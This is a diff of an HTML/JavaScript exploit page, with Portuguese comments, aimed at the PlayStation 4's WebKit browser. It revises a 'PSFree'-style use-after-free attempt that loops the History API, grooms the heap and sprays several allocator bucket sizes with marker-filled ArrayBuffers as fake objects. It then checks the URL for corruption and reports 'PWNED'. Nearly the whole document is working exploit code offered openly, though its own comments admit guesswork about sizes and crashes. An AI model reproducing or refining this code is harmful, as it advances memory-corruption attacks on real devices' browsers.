@@ -2,205 +2,158 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Architecture Upgrade</title>
+<title>PS4 WebKit - Bucket Shotgun</title>
 <style>
-    body { background-color: #111; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; font-size: 12px; }
-    .log-entry { border-bottom: 1px solid #333; padding: 2px 0; }
-    .success { color: #0ff; font-weight: bold; background: #004444; }
-    .fail { color: #f55; }
-    .info { color: #aaa; }
-    button { padding: 15px; width: 100%; background: #222; color: #fff; border: 1px solid #555; cursor: pointer; font-weight: bold; margin-bottom: 10px; }
-    button:hover { background: #0f0; color: #000; }
+    body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
+    button { 
+        padding: 20px; width: 100%; margin-bottom: 10px;
+        font-weight: bold; font-size: 16px; cursor: pointer; 
+        border: 2px solid #0f0; background: #003300; color: #fff;
+    }
+    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
+    .pwned { background-color: #fff; color: #000; font-size: 1.5em; font-weight: bold; }
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - PSFree Logic Implementation</h2>
-<div id="status">Status: Idle</div>
-<button onclick="main()">INICIAR EXPLOIT COMPLEXO</button>
+<h2>PS4 WebKit - Multi-Bucket Reclaim</h2>
+<div id="status">Alvo: HistoryItem (0x50) + Variações</div>
+<button onclick="runShotgunExploit()">INICIAR RECLAIM (BUCKET SHOTGUN)</button>
 <div id="log"></div>
 
 <script>
-// ==========================================
-// 1. HELPERS & PRIMITIVES (Baseado em int64.mjs)
-// ==========================================
 const logEl = document.getElementById("log");
-function log(msg, type="info") {
-    const div = document.createElement("div");
-    div.className = "log-entry " + type;
-    div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-    logEl.appendChild(div);
+const statusEl = document.getElementById("status");
+
+function log(m) { 
+    const d = document.createElement("div");
+    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
+    logEl.appendChild(d);
     logEl.scrollTop = logEl.scrollHeight;
 }
 
-// Simulador de Int64 para ponteiros de memória
-class Ptr {
-    constructor(lo, hi) {
-        this.lo = lo >>> 0;
-        this.hi = hi >>> 0;
-    }
-    toString() {
-        return "0x" + this.hi.toString(16).padStart(8,'0') + this.lo.toString(16).padStart(8,'0');
-    }
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// Armazena os objetos para impedir o GC de limpar
+var keepAlive = [];
+
+// Helper para criar Fake Objects visualmente identificáveis
+function createFakeObject(size, marker) {
+    try {
+        let buf = new ArrayBuffer(size);
+        let view = new Uint32Array(buf);
+        // Preenche com o marcador (ex: 0x41414141)
+        for(let i=0; i<view.length; i++) {
+            view[i] = marker;
+        }
+        return buf;
+    } catch(e) { return null; }
 }
 
-// ==========================================
-// 2. MEMORY TOOLS (Baseado em memtools.mjs)
-// ==========================================
-var pressure = [];
-var bufs = [];
-
-// Força o GC de forma agressiva (Linha 106 psfree.mjs)
-function forceGC() {
-    for (let i = 0; i < 4; i++) {
-        new ArrayBuffer(8 * 1024 * 1024);
-    }
-}
-
-// Cria um buffer com conteúdo específico (Fake Object)
-function create_fake_object(size) {
-    // Cria um buffer do tamanho exato do objeto alvo (0x50 = 80 bytes)
-    // Usamos Uint32Array para escrever inteiros de 4 bytes
-    const buf = new ArrayBuffer(size);
-    const view = new Uint32Array(buf);
-    
-    // Preenche com um padrão que imita um objeto JSCell válido
-    // 0x00001337 é nosso marcador, mas em formato de Header
-    for(let i=0; i < view.length; i++) {
-        view[i] = 0x41414141; // AAAAAAAA
-    }
-    
-    // Header falso (Structure ID + Flags)
-    view[0] = 0x00001337; 
-    view[1] = 0x01001600; // Butterfly fictícia ou Flags
-    
-    return buf;
-}
-
-// ==========================================
-// 3. EXPLOIT CORE (Lógica do psfree.mjs)
-// ==========================================
-async function main() {
+async function runShotgunExploit() {
     logEl.innerHTML = "";
-    log("Iniciando PSFree Logic Port...", "info");
+    keepAlive = [];
+    statusEl.innerText = "Preparando...";
 
-    // CONFIGURAÇÃO DO ALVO
-    // No psfree.mjs, o tamanho do SSV (SerializedScriptValue) para FW > 9.00 é 0x50 (80 bytes).
-    // O alocador alinha isso para 96 bytes ou 128 bytes.
-    const TARGET_SIZE = 80; 
-    const ALLOC_SIZE = 96; // Tamanho real no bucket do bmalloc
-    
-    log(`Alvo: SerializedScriptValue (0x${TARGET_SIZE.toString(16)} bytes)`, "info");
-    log(`Bucket Estimado: ${ALLOC_SIZE} bytes`, "info");
+    // === DEFINIÇÃO DOS BUCKETS ===
+    // O alvo é 80 bytes. Vamos atacar os vizinhos de alocação.
+    const BUCKETS = [
+        { size: 80,  marker: 0x41414141 }, // 'AAAA' (Alvo exato)
+        { size: 96,  marker: 0x42424242 }, // 'BBBB' (Header +16)
+        { size: 64,  marker: 0x43434343 }, // 'CCCC' (Menor)
+        { size: 128, marker: 0x44444444 }  // 'DDDD' (Maior)
+    ];
 
-    // FASE 1: HEAP FENG SHUI (PREPARAÇÃO)
-    // Criamos milhares de objetos desse tamanho para "amaciar" o Heap
-    log("1. Heap Grooming (Massive Spray)...", "info");
-    
-    const GROOM_COUNT = 10000;
-    let grooming = new Array(GROOM_COUNT);
-    
-    for(let i=0; i<GROOM_COUNT; i++) {
-        // Usamos ArrayBuffer porque ele permite controle byte-a-byte sem overhead de string
-        grooming[i] = new ArrayBuffer(TARGET_SIZE); 
+    log("1. Preparando Grooming (Pré-alocação)...");
+    // Aloca alguns objetos de cada tamanho para "aquecer" os buckets do bmalloc
+    for(let b of BUCKETS) {
+        for(let k=0; k<100; k++) keepAlive.push(createFakeObject(b.size, b.marker));
     }
     
-    // Criar buracos (Swiss Cheese)
-    // Liberamos 1 a cada 4 para criar slots livres perfeitos
-    for(let i=0; i<GROOM_COUNT; i+=4) {
-        grooming[i] = null;
-    }
-    
-    forceGC();
-    await sleep(100);
-    log("Heap preparado. Buracos alinhados.", "success");
+    // Libera 25% deles para criar buracos (Swiss Cheese)
+    // Isso ajuda o UAF a cair num lugar conhecido
+    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);
 
-    // FASE 2: TRIGGER UAF
-    log("2. Disparando UAF (History API)...", "info");
+    // === TRIGGER UAF ===
+    log("2. Disparando UAF (Loop 48)...");
     
-    // Variáveis do UAF original
     let size = 977;
     const STEP = 14461;
-    let found = false;
 
-    // Loop crítico
+    // Loop corrigido para 48 (o 64 causava crash por exaustão)
     for(let i = 0; i < 48; i++) {
-        // Cria string "V"
-        let frag = "V".repeat(size);
-        
-        // Push State
+        let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
-        
-        // Replace (Libera a anterior)
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
-        // O UAF acontece aqui no back()
-        if(i % 5 === 0) {
-            setTimeout(() => {
-                history.back();
-            }, 0);
-            
-            // FASE 3: RECLAIM (SPRAY IMEDIATO)
-            // Aqui usamos a técnica do PSFree: Preencher o slot liberado
-            // com um Fake Object (ArrayBuffer manipulado)
-            if(i > 40) { // Só sprayamos quando o heap estiver instável
-                do_spray(TARGET_SIZE, 200); // 200 objetos por tentativa
-            }
-        }
+        if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
-        size += STEP;
-        await sleep(5);
+        // MOMENTO CRÍTICO (Iteração final)
+        if (i === 47) {
+            log(">>> SPRAY MULTI-BUCKET <<<");
+            
+            // 1. Libera o HistoryItem
+            setTimeout(() => history.back(), 0);
+            
+            // 2. Spray Imediato de TODOS os tamanhos
+            // Isso aumenta drasticamente a chance de acertar o bucket correto
+            doShotgunSpray(BUCKETS);
+            
+            // 3. Force GC (Crucial do psfree.mjs)
+            setTimeout(() => forceGC(), 20); 
+        } else {
+            size += STEP;
+            await sleep(5);
+        }
     }
     
-    log("Loop UAF finalizado. Aguardando estabilização...", "info");
-    await sleep(500);
-    
-    // FASE 4: CHECK
-    check_success();
+    await sleep(400); // Espera o pó baixar
+    checkResult();
 }
 
-function do_spray(size, count) {
-    // Cria N buffers com o conteúdo malicioso
-    for(let k=0; k<count; k++) {
-        bufs.push(create_fake_object(size));
+function doShotgunSpray(buckets) {
+    // Aloca 200 objetos de CADA tamanho
+    // Total: ~800 objetos injetados no milissegundo crítico
+    for(let k=0; k<200; k++) {
+        for(let b of buckets) {
+            keepAlive.push(createFakeObject(b.size, b.marker));
+        }
     }
 }
 
-function check_success() {
+function forceGC() {
+    // Pressão de memória para limpar o lixo e validar o spray
+    for (let i = 0; i < 4; i++) new ArrayBuffer(8 * 1024 * 1024);
+}
+
+function checkResult() {
+    statusEl.innerText = "Analisando Memória...";
     let url = document.URL;
+    let found = false;
+    let markerFound = "";
     
-    // Se o exploit funcionar, o HistoryItem (que contém o ponteiro da string)
-    // será substituído pelo nosso ArrayBuffer (0x41414141...)
-    // Isso fará o ponteiro da string apontar para lixo ou para nosso buffer.
+    // Procura pelos nossos marcadores na URL
+    // Se o HistoryItem (container) foi sobrescrito, o ponteiro da string agora
+    // aponta para 0x41414141 (endereço inválido -> CRASH) ou dados lidos do nosso buffer.
     
-    // 1. Verifica se 'V' sumiu (sucesso parcial)
-    // 2. Verifica se 'A' (0x41) apareceu (sucesso total)
-    // 3. Verifica Crash (sucesso total - prova controle de ponteiro)
-    
-    let isV = true;
-    let magic = false;
-    
-    // Amostragem
-    for(let i=2000; i<3000; i++) {
-        let code = url.charCodeAt(i);
-        if(code === 0x41) magic = true;
-        if(code !== 0x56) isV = false;
+    for(let i=0; i < url.length && i < 5000; i++) {
+        let c = url.charCodeAt(i);
+        if(c === 0x41) { found = true; markerFound = "AAAA (80 bytes)"; break; }
+        if(c === 0x42) { found = true; markerFound = "BBBB (96 bytes)"; break; }
+        if(c === 0x43) { found = true; markerFound = "CCCC (64 bytes)"; break; }
+        if(c === 0x44) { found = true; markerFound = "DDDD (128 bytes)"; break; }
     }
-    
-    if(magic) {
-        log("!!! GOD MODE !!!", "success");
-        log("Estrutura do objeto sobrescrita com 0x41414141", "success");
-        document.getElementById("status").innerText = "PWNED";
-    } else if (!isV) {
-        log("!!! GLITCH DETECTADO !!!", "success");
-        log("URL corrompida (não é mais 'V'). O objeto foi afetado.", "success");
-        log("Dados: " + url.substring(2000, 2050), "info");
+
+    if(found) {
+        log("!!! SUCESSO !!!");
+        log(`Bucket Vencedor: ${markerFound}`);
+        statusEl.innerText = "PWNED";
+        statusEl.className = "pwned";
     } else {
-        log("Falha: Objeto ainda intacto ('V').", "fail");
-        log("Diagnóstico: O tamanho de 80 bytes pode estar incorreto para este FW.", "info");
+        // Se ainda for V, verifica se o navegador está instável
+        log("Status: Objeto intacto ('V').");
+        log("Nota: Se o console crashar nos próximos segundos, o tamanho de 80 bytes funcionou (Crash = Sucesso de Escrita).");
     }
 }
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 </script>
 </body>
 </html>
